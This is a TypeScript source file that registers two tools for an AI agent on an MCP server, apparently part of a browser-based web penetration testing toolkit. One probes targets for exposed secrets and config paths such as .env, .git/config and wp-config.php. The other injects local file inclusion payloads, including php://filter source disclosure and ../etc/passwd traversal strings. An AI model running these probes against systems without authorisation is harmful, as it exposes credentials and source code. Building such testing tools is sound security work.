import { z } from 'zod'

import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'

import { repeaterSendRaw } from '../../repeater'
import { ok, err, errorMessage } from '../utils'

const DEFAULT_WORDLIST = [
  // VCS / backups
  '.git/HEAD',
  '.git/config',
  '.svn/entries',
  '.hg/store',
  '.bzr/branch/last-revision',
  // Editor swap files
  '.index.php.swp',
  '.index.html.swp',
  '.bak',
  '.old',
  '~',
  // Environment / config
  '.env',
  '.env.local',
  '.env.production',
  'config.php',
  'config.json',
  'composer.json',
  'composer.lock',
  'package.json',
  'package-lock.json',
  'yarn.lock',
  'pnpm-lock.yaml',
  'docker-compose.yml',
  'Dockerfile',
  'wp-config.php',
  // Server status / debug
  'server-status',
  'server-info',
  'phpinfo.php',
  'info.php',
  'test.php',
  'debug.php',
  // Common admin paths
  'admin/',
  'administrator/',
  'wp-admin/',
  'phpmyadmin/',
  // Sourcemap leaks
  'main.js.map',
  'app.js.map',
  'bundle.js.map',
  // Robots / sitemap
  'robots.txt',
  'sitemap.xml',
  'security.txt',
  '.well-known/security.txt'
]

const LFI_TEMPLATES = [
  // php://filter source disclosure variants
  'php://filter/convert.base64-encode/resource=index',
  'php://filter/convert.base64-encode/resource=index.php',
  'php://filter/read=string.rot13/resource=index.php',
  // Path traversal
  '../../../etc/passwd',
  '....//....//....//etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd'
]

export function registerPathProbeTools(mcp: McpServer) {
  mcp.registerTool(
    'path_probe',
    {
      description:
        'Probe common backup/disclosure paths (.git/HEAD, .env, *.swp, server-status, sourcemaps, wp-config). Reports any path returning 200 / non-default response. Provide baseUrl OR use the active page origin.',
      inputSchema: {
        baseUrl: z.string().optional().describe('e.g. https://target.com/. Defaults to active origin.'),
        wordlist: z.array(z.string()).optional().describe('Override the default path list'),
        concurrency: z.number().int().positive().max(20).optional().describe('Default 6'),
        useDefault: z
          .boolean()
          .optional()
          .describe('Merge user wordlist with builtin (default true)')
      }
    },
    async ({ baseUrl, wordlist, concurrency = 6, useDefault = true }) => {
      try {
        let origin = baseUrl
        if (!origin) {
          const { getActiveTarget } = await import('../../chrome-cdp')
          const target = getActiveTarget()
          if (!target) return err('no active page; supply baseUrl')
          const r = (await target.dbg.sendCommand('Runtime.evaluate', {
            expression: 'location.origin',
            returnByValue: true
          })) as { result: { value?: string } }
          origin = r.result.value
        }
        if (!origin) return err('could not resolve base URL')

        const base = origin.endsWith('/') ? origin : origin + '/'
        const paths = [...(wordlist ?? []), ...(useDefault ? DEFAULT_WORDLIST : [])]
        const queue = paths.map((p) => (p.startsWith('http') ? p : base + p.replace(/^\//, '')))

        const results: Array<{
          url: string
          status: number
          length: number
          contentType?: string
          interesting: boolean
        }> = []

        async function worker() {
          while (queue.length > 0) {
            const u = queue.shift()
            if (!u) break
            try {
              const target = (await import('../../chrome-cdp')).getActiveTarget()
              if (!target) break
              const expr = `(async () => {
                try {
                  const t0 = performance.now();
                  const r = await fetch(${JSON.stringify(u)}, { credentials: 'include', redirect: 'manual' });
                  const buf = await r.arrayBuffer();
                  return { status: r.status, length: buf.byteLength, ct: r.headers.get('content-type') || '' };
                } catch (e) { return { status: 0, length: 0, error: e.message, ct: '' }; }
              })()`
              const r = (await target.dbg.sendCommand('Runtime.evaluate', {
                expression: expr,
                awaitPromise: true,
                returnByValue: true
              })) as { result: { value: { status: number; length: number; ct: string } } }
              const v = r.result.value
              const interesting = v.status >= 200 && v.status < 400 && v.status !== 301 && v.status !== 302
              results.push({
                url: u,
                status: v.status,
                length: v.length,
                contentType: v.ct,
                interesting
              })
            } catch (e) {
              results.push({ url: u, status: 0, length: 0, interesting: false })
            }
          }
        }
        await Promise.all(Array.from({ length: concurrency }, () => worker()))
        results.sort((a, b) => Number(b.interesting) - Number(a.interesting))

        return ok(
          JSON.stringify(
            {
              baseUrl: base,
              probed: results.length,
              interesting: results.filter((r) => r.interesting).length,
              results
            },
            null,
            2
          )
        )
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )

  mcp.registerTool(
    'lfi_probe',
    {
      description:
        'Try common LFI payloads (php://filter source disclosure, ../etc/passwd traversal) against a vulnerable URL parameter. The marker `§` is replaced with each payload.',
      inputSchema: {
        requestId: z.string().describe('Base requestId (must contain § marker in URL/body)'),
        payloads: z.array(z.string()).optional().describe('Override default LFI payloads')
      }
    },
    async ({ requestId, payloads }) => {
      try {
        const { buildRequestSpec } = await import('../../repeater')
        const spec = buildRequestSpec(requestId, undefined)
        const list = payloads ?? LFI_TEMPLATES
        const results: Array<{ payload: string; status: number; length: number; preview: string }> = []
        for (const p of list) {
          const sub = {
            ...spec,
            url: spec.url.replaceAll('§', encodeURIComponent(p)),
            body: spec.body?.replaceAll('§', p)
          }
          const r = await repeaterSendRaw(sub)
          results.push({
            payload: p,
            status: r.status,
            length: r.bodyByteLength,
            preview: r.body.slice(0, 200)
          })
        }
        return ok(JSON.stringify(results, null, 2))
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )
}
